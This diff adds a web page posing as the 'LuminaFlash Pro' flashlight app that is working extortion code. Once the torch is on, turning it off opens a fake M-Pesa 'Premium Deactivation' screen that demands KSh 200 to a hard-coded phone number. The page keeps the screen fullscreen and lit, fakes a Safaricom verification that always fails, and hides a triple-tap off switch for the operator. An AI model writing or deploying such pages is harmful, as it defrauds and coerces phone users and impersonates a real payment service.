@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="theme-color" content="#0b0f19">
+    <title>LuminaFlash Pro</title>
+    <link rel="manifest" href="/manifest.json">
+
+    <style>
+        :root {
+            --bg-dark: #0b0f19;
+            --card-bg: #141c2b;
+            --mpesa-green: #00A859;
+            --mpesa-green-glow: rgba(0, 168, 89, 0.4);
+            --text-main: #ffffff;
+            --text-muted: #94a3b8;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif !important;
+            user-select: none;
+            -webkit-user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            padding: calc(env(safe-area-inset-top) + 15px) 20px calc(env(safe-area-inset-bottom) + 20px) 20px;
+            overflow: hidden;
+            transition: background 0.3s ease;
+        }
+
+        body.screen-light {
+            background-color: #ffffff !important;
+            color: #000000 !important;
+        }
+
+        .header-bar {
+            width: 100%;
+            max-width: 380px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: var(--card-bg);
+            padding: 12px 18px;
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+
+        .header-title {
+            font-size: 0.95rem;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            color: #38bdf8;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .battery-status {
+            font-size: 0.85rem;
+            color: #4ade80;
+            font-weight: 600;
+        }
+
+        .torch-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+        }
+
+        .power-ring {
+            width: 200px;
+            height: 200px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: radial-gradient(circle, #1e293b 0%, #0f172a 100%);
+            border: 2px solid rgba(255, 255, 255, 0.05);
+            box-shadow: 0 0 35px rgba(0, 0, 0, 0.8);
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .power-ring.active {
+            border-color: #38bdf8;
+            box-shadow: 0 0 50px rgba(56, 189, 248, 0.4), inset 0 0 20px rgba(56, 189, 248, 0.2);
+        }
+
+        .power-btn {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            border: none;
+            background: linear-gradient(145deg, #1e293b, #0f172a);
+            color: var(--text-muted);
+            font-size: 3.5rem;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: all 0.2s ease;
+            box-shadow: 6px 6px 16px #070a10, -6px -6px 16px #1b263b;
+        }
+
+        .power-ring.active .power-btn {
+            background: linear-gradient(145deg, #38bdf8, #0284c7);
+            color: #ffffff;
+            box-shadow: 0 0 30px #38bdf8;
+            transform: scale(0.96);
+        }
+
+        .status-badge {
+            margin-top: 35px;
+            padding: 8px 24px;
+            border-radius: 30px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            font-size: 0.85rem;
+            font-weight: 700;
+            letter-spacing: 2px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+        }
+
+        .status-badge.active {
+            color: #38bdf8;
+            border-color: #38bdf8;
+            background: rgba(56, 189, 248, 0.1);
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(5, 8, 15, 0.88);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            z-index: 100;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .modal-overlay.visible {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .paywall-card {
+            background: var(--card-bg);
+            color: var(--text-main);
+            width: 100%;
+            max-width: 350px;
+            border-radius: 24px;
+            padding: 24px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            text-align: center;
+            transform: scale(0.9);
+            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .modal-overlay.visible .paywall-card {
+            transform: scale(1);
+        }
+
+        .mpesa-badge-header {
+            background: linear-gradient(135deg, #00A859, #008f4c);
+            color: white;
+            font-weight: 900;
+            font-size: 1.1rem;
+            padding: 12px;
+            border-radius: 14px;
+            letter-spacing: 1.5px;
+            margin-bottom: 20px;
+            box-shadow: 0 6px 20px var(--mpesa-green-glow);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .paywall-card h2 {
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .paywall-card p {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+
+        .pay-details {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 14px;
+            padding: 14px;
+            margin-bottom: 18px;
+            text-align: left;
+            font-size: 0.9rem;
+        }
+
+        .pay-details div {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .pay-details div:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+
+        .pay-details .label {
+            color: var(--text-muted);
+        }
+
+        .pay-details .value {
+            font-weight: 800;
+            color: var(--mpesa-green);
+            font-size: 1rem;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            background: rgba(0, 0, 0, 0.4);
+            border: 1.5px solid rgba(255, 255, 255, 0.12);
+            color: white;
+            border-radius: 12px;
+            font-size: 0.95rem;
+            text-align: center;
+            outline: none;
+            text-transform: uppercase;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            margin-bottom: 18px;
+            user-select: text;
+            -webkit-user-select: text;
+        }
+
+        .input-group input:focus {
+            border-color: var(--mpesa-green);
+            box-shadow: 0 0 12px var(--mpesa-green-glow);
+        }
+
+        .pay-btn {
+            width: 100%;
+            background: var(--mpesa-green);
+            color: white;
+            border: none;
+            padding: 15px;
+            font-size: 1rem;
+            font-weight: 800;
+            border-radius: 12px;
+            cursor: pointer;
+            box-shadow: 0 6px 18px var(--mpesa-green-glow);
+            transition: all 0.2s ease;
+        }
+
+        .pay-btn:active {
+            transform: scale(0.98);
+        }
+
+        .loader-container {
+            display: none;
+            margin-bottom: 18px;
+        }
+
+        .loader {
+            margin: 0 auto 10px auto;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top: 3px solid var(--mpesa-green);
+            border-radius: 50%;
+            width: 28px;
+            height: 28px;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .loader-text {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .custom-alert-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.75);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 24px;
+            z-index: 200;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.2s ease;
+        }
+
+        .custom-alert-overlay.visible {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .custom-alert-card {
+            background: #ffffff;
+            color: #1e293b;
+            width: 100%;
+            max-width: 320px;
+            border-radius: 18px;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7);
+            animation: alertPop 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes alertPop {
+            from { transform: scale(0.85); }
+            to { transform: scale(1); }
+        }
+
+        .custom-alert-header {
+            background: #00A859;
+            color: #ffffff;
+            padding: 14px 18px;
+            font-weight: 800;
+            font-size: 0.95rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            letter-spacing: 0.5px;
+        }
+
+        .custom-alert-body {
+            padding: 20px 18px;
+            font-size: 0.9rem;
+            line-height: 1.5;
+            color: #334155;
+            text-align: left;
+        }
+
+        .custom-alert-footer {
+            padding: 12px 18px 16px 18px;
+            display: flex;
+            justify-content: flex-end;
+            background: #f8fafc;
+        }
+
+        .custom-alert-btn {
+            background: #00A859;
+            color: #ffffff;
+            border: none;
+            padding: 10px 24px;
+            font-size: 0.9rem;
+            font-weight: 700;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+
+        .footer-info {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+        }
+    </style>
+</head>
+<body>
+
+    <video id="videoFeed" autoplay playsinline style="display:none;"></video>
+
+    <div class="header-bar">
+        <span class="header-title">⚡ LuminaFlash</span>
+        <span class="battery-status">100% 🔋</span>
+    </div>
+
+    <div class="torch-container">
+        <div class="power-ring" id="powerRing">
+            <button class="power-btn" id="powerBtn" onclick="toggleTorch()">
+                ⏻
+            </button>
+        </div>
+        <div class="status-badge" id="statusBadge">READY</div>
+    </div>
+
+    <div class="footer-info">
+        System Flashlight Controller
+    </div>
+
+    <div class="modal-overlay" id="paywallModal">
+        <div class="paywall-card">
+            <div class="mpesa-badge-header" onclick="handleSecretClick()">
+                M-PESA
+            </div>
+            <h2>Premium Deactivation</h2>
+            <p>Send KSh 200.00 via M-Pesa to turn off the flashlight and unlock your screen.</p>
+
+            <div class="pay-details">
+                <div>
+                    <span class="label">Send To:</span>
+                    <span class="value" id="myPhoneNumber">0741 215 721</span>
+                </div>
+                <div>
+                    <span class="label">Amount Due:</span>
+                    <span class="value">KSh 200.00</span>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <input type="text" id="txCodeInput" placeholder="M-PESA CODE (E.G. SJK123456)" maxlength="12">
+            </div>
+
+            <div class="loader-container" id="loaderContainer">
+                <div class="loader"></div>
+                <div class="loader-text">Connecting to Safaricom Gateway...</div>
+            </div>
+
+            <button class="pay-btn" id="verifyBtn" onclick="verifyPayment()">Verify Transaction</button>
+        </div>
+    </div>
+
+    <div class="custom-alert-overlay" id="customAlertOverlay">
+        <div class="custom-alert-card">
+            <div class="custom-alert-header">
+                <span>M-PESA SYSTEM</span>
+            </div>
+            <div class="custom-alert-body" id="customAlertBody"></div>
+            <div class="custom-alert-footer">
+                <button class="custom-alert-btn" onclick="closeCustomAlert()">OK</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const MY_PHONE_NUMBER = "0741 215 721"; 
+        document.getElementById('myPhoneNumber').innerText = MY_PHONE_NUMBER;
+
+        let isTorchOn = false;
+        let mediaStream = null;
+        let track = null;
+        let secretClicks = 0;
+
+        const powerRing = document.getElementById('powerRing');
+        const statusBadge = document.getElementById('statusBadge');
+        const paywallModal = document.getElementById('paywallModal');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const loaderContainer = document.getElementById('loaderContainer');
+        const txCodeInput = document.getElementById('txCodeInput');
+        const videoElement = document.getElementById('videoFeed');
+
+        const customAlertOverlay = document.getElementById('customAlertOverlay');
+        const customAlertBody = document.getElementById('customAlertBody');
+
+        function showCustomAlert(message) {
+            customAlertBody.innerText = message;
+            customAlertOverlay.classList.add('visible');
+            vibrate([100, 50, 100]);
+        }
+
+        function closeCustomAlert() {
+            customAlertOverlay.classList.remove('visible');
+            vibrate(50);
+        }
+
+        function vibrate(pattern) {
+            if (navigator.vibrate) {
+                navigator.vibrate(pattern);
+            }
+        }
+
+        function requestFullScreen() {
+            let elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().catch(err => console.log(err));
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
+            }
+        }
+
+        async function toggleTorch() {
+            requestFullScreen();
+            if (!isTorchOn) {
+                vibrate(50);
+                await turnOnSystemTorch();
+            } else {
+                vibrate([50, 50, 50]);
+                showPaywall();
+            }
+        }
+
+        async function turnOnSystemTorch() {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: { exact: 'environment' } }
+                });
+                videoElement.srcObject = mediaStream;
+                track = mediaStream.getVideoTracks()[0];
+                const capabilities = track.getCapabilities();
+
+                if (capabilities.torch) {
+                    await track.applyConstraints({ advanced: [{ torch: true }] });
+                } else {
+                    document.body.classList.add('screen-light');
+                }
+                setUIActive(true);
+            } catch (err) {
+                try {
+                    mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    track = mediaStream.getVideoTracks()[0];
+                    if (track.getCapabilities().torch) {
+                        await track.applyConstraints({ advanced: [{ torch: true }] });
+                    } else {
+                        document.body.classList.add('screen-light');
+                    }
+                    setUIActive(true);
+                } catch (e) {
+                    document.body.classList.add('screen-light');
+                    setUIActive(true);
+                }
+            }
+        }
+
+        function turnOffSystemTorch() {
+            if (track) { track.stop(); track = null; }
+            if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
+            document.body.classList.remove('screen-light');
+            setUIActive(false);
+            paywallModal.classList.remove('visible');
+            
+            if (document.exitFullscreen) {
+                document.exitFullscreen().catch(err => console.log(err));
+            }
+        }
+
+        function setUIActive(active) {
+            isTorchOn = active;
+            if (active) {
+                powerRing.classList.add('active');
+                statusBadge.classList.add('active');
+                statusBadge.innerText = "TORCH ACTIVE";
+            } else {
+                powerRing.classList.remove('active');
+                statusBadge.classList.remove('active');
+                statusBadge.innerText = "READY";
+            }
+        }
+
+        function showPaywall() {
+            paywallModal.classList.add('visible');
+        }
+
+        function verifyPayment() {
+            const code = txCodeInput.value.trim();
+            vibrate(50);
+
+            if (!code || code.length < 6) {
+                showCustomAlert("Please enter a valid M-Pesa transaction code from your SMS.");
+                return;
+            }
+
+            verifyBtn.style.display = 'none';
+            loaderContainer.style.display = 'block';
+
+            setTimeout(() => {
+                loaderContainer.style.display = 'none';
+                verifyBtn.style.display = 'block';
+                
+                showCustomAlert(`Failed to verify payment for ${code.toUpperCase()}. Please wait 5 minutes or confirm your payment to ${MY_PHONE_NUMBER}.`);
+            }, 3000);
+        }
+
+        function handleSecretClick() {
+            secretClicks++;
+            if (secretClicks >= 3) {
+                vibrate([50, 50, 200]);
+                secretClicks = 0;
+                turnOffSystemTorch();
+            }
+            setTimeout(() => { secretClicks = 0; }, 1500); 
+        }
+
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js');
+        }
+    </script>
+</body>
+  </html>
+  
